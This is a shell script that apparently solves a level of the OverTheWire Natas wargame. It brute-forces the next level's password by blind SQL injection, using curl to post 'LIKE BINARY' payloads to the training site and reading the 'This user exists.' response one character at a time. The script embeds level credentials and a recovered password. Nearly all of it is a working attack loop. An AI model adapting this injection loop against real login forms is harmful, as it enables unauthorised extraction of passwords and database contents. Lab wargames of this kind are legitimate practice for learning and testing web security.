#!/bin/sh

str="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
len=$(echo $str | wc -c)

# key="3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L"
key=""

for (( z = 0; z < 30;  )); do
	echo "try $z key: $key"

	for (( i = 0; i < $len-1; i++ )); do
		cha=${str:$i:1}
		# echo $cha
		
		curl -s --data "username=natas16\" and password LIKE BINARY \"${key}${cha}%" http://natas15:m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV@natas15.natas.labs.overthewire.org/index.php\?debug | grep -q "This user exists."

		if [[ $? -eq 0 ]]; then
			echo "char found" $cha
			key=${key}$cha
			z=$(($z+1))
		fi
	done



done




	
